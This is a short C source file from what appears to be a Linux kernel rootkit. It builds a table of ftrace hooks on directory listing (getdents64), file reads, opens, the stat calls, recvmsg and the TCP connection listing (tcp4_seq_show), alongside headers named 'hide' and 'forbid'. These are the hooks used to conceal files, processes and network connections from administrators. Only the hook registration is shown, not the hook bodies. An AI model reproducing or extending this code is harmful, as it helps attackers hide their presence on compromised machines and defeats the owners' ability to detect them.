#include "alterate.h"
#include "forbid.h"
#include "ftrace.h"
#include "hide.h"

struct ftrace_hook hooks[] = {
    HOOK_SYS("sys_getdents64", getdents64_hook, &__orig_getdents64),
    HOOK_SYS("sys_read", read_hook, &__orig_read),
    HOOK_SYS("sys_openat", openat_hook, &__orig_openat),
    HOOK_SYS("sys_newfstatat", stat_hook, &__orig_newfstatat),
    HOOK_SYS("sys_fstat", stat_hook, &__orig_fstat),
    HOOK_SYS("sys_lstat", stat_hook, &__orig_lstat),
    HOOK_SYS("sys_stat", stat_hook, &__orig_stat),
    HOOK_SYS("sys_recvmsg", recvmsg_hook, &__orig_recvmsg),

    HOOK("tcp4_seq_show", tcp4_seq_show_hook, &__orig_tcp4_seq_show)
};

size_t hook_array_size = sizeof(hooks) / sizeof(hooks[0]);
